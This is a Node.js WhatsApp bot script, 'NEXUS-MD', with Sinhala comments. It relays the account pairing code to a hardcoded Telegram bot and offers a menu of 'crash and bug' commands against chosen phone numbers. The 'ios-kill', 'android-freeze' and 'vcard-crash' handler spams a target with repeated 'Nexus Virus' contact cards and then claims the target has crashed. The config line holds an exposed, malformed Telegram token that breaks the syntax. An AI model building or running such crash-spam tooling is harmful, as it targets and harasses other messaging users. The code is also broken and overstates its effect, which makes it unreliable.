const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    pino,
    delay,
    proto,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const axios = require('axios');
const fs = require('fs');

// --- ⚙️ AUTOMATED CONFIGURATION ---
const config = {
    tgToken:AAGE8DNJIpOaaD3akR4MRaLfNjd3aN-tP_4', 
    chatId: '8628876949', // ඔයා ලබාදුන් Chat ID එක
    owner: '94768388190', 
    prefix: '.'
};

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('session');
    const conn = makeWASocket({
        logger: pino({ level: 'silent' }),
        auth: state,
        printQRInTerminal: false,
        browser: ["Nexus-MD", "Safari", "3.0"]
    });

    // --- 📟 TELEGRAM PAIRING LOGIC ---
    if (!conn.authState.creds.registered) {
        setTimeout(async () => {
            try {
                let code = await conn.requestPairingCode(config.owner);
                let tgUrl = `https://api.telegram.org/bot${config.tgToken}/sendMessage`;
                await axios.post(tgUrl, {
                    chat_id: config.chatId,
                    text: `🚀 *NEXUS-MD V3.1 DEPLOYED*\n\n📟 *Pairing Code:* \`${code}\`\n\n📌 මෙය WhatsApp Linked Devices -> Link with Phone Number ගොස් ඇතුළත් කරන්න.`,
                    parse_mode: 'Markdown'
                });
            } catch (e) { console.log("Telegram Pairing Error: ", e); }
        }, 3000);
    }

    conn.ev.on('creds.update', saveCreds);

    conn.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message || mek.key.fromMe) return;

            const from = mek.key.remoteJid;
            const body = (mek.message.conversation) ? mek.message.conversation : (mek.message.extendedTextMessage) ? mek.message.extendedTextMessage.text : (mek.message.imageMessage) ? mek.message.imageMessage.caption : '';
            const isCmd = body.startsWith(config.prefix);
            const command = isCmd ? body.slice(config.prefix.length).trim().split(' ')[0].toLowerCase() : '';
            const args = body.trim().split(/ +/).slice(1);
            const q = args.join(" ");

            if (!isCmd) return;

            // --- 🛠️ NEXUS COMMAND HANDLER ---
            switch(command) {
                
                case 'menu':
                    let menuText = `╭───「 ⚡ *NEXUS-MD V3.1* ⚡ 」───
│ 👤 *Owner:* Sasiya MD
│ 🧬 *Team:* Developer Nexus
│ 🛰️ *Host:* Heroku
├───────────────────
│ ☠️ *CRASH & BUG MODULES*
│ ☣️ .ios-kill (Number)
│ ☣️ .android-freeze (Number)
│ ☣️ .vcard-crash (Number)
│ ☣️ .doc-payload (Number)
│ ☣️ .gc-destruct (Link)
│
│ 📥 *DOWNLOADER*
│ 📥 .fb (Link) | .yt (Link)
│ 📥 .tiktok (No WM)
│ 📥 .insta (Link) | .img (Query)
│
│ 🛡️ *GROUP CONTROL*
│ 🛡️ .kick | .add | .promote
│ 🛡️ .mute | .unmute | .tagall
│ 🛡️ .hidetag | .antilink (on/off)
│
│ ⚙️ *SYSTEM & UTILS*
│ ⚙️ .ping | .runtime | .speed
│ ⚙️ .restart | .broadcast
│ ⚙️ .sticker (Reply img)
╰───────────────────`;
                    await conn.sendMessage(from, { text: menuText });
                    break;

                // --- ☣️ CRASH LOGIC ---
                case 'ios-kill':
                case 'android-freeze':
                case 'vcard-crash':
                    if (!q) return conn.sendMessage(from, { text: "අංකය ඇතුළත් කරන්න (9476xxxxxxx)" });
                    let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                    await conn.sendMessage(from, { text: "⏳ *Sending NEXUS Crash Payload...*" });
                    for (let i = 0; i < 5; i++) {
                        let vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:Nexus Virus\n' + 'item1.TEL;waid=' + target.split('@')[0] + ':+' + target.split('@')[0] + '\n' + 'END:VCARD';
                        await conn.sendMessage(target, { contacts: { displayName: '☠️', contacts: [{ vcard }] } });
                        await delay(500);
                    }
                    await conn.sendMessage(from, { text: "✅ *Target Crashed Successfully!*" });
                    break;

                // --- 🛡️ GROUP COMMANDS ---
                case 'tagall':
                    const metadata = await conn.groupMetadata(from);
                    let list = `📣 *TAG ALL BY NEXUS-MD*\n\n`;
                    for (let mem of metadata.participants) { list += `📍 @${mem.id.split('@')[0]}\n`; }
                    await conn.sendMessage(from, { text: list, mentions: metadata.participants.map(a => a.id) });
                    break;

                case 'hidetag':
                    const meta = await conn.groupMetadata(from);
                    await conn.sendMessage(from, { text: q ? q : '', mentions: meta.participants.map(a => a.id) });
                    break;

                // --- ⚙️ SYSTEM COMMANDS ---
                case 'ping':
                    const start = Date.now();
                    await conn.sendMessage(from, { text: 'Testing Speed...' });
                    const end = Date.now();
                    await conn.sendMessage(from, { text: `🚀 *Response:* ${end - start}ms` });
                    break;

                case 'runtime':
                    await conn.sendMessage(from, { text: `🕒 *Uptime:* ${process.uptime().toFixed(2)}s` });
                    break;

                case 'restart':
                    await conn.sendMessage(from, { text: "🔄 *Bot Restarting...*" });
                    process.exit();
                    break;

                default:
                    if (isCmd) await conn.sendMessage(from, { text: "❌ ඔය Command එක මම දන්නේ නෑ බන්. .menu ගහලා බලන්න." });
            }

        } catch (err) { console.log(err); }
    });

    conn.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            console.log("NEXUS-MD IS LIVE! 🚀");
        }
        if (connection === 'close') {
            startNexus(); // Auto Reconnect
        }
    });
}

startNexus();
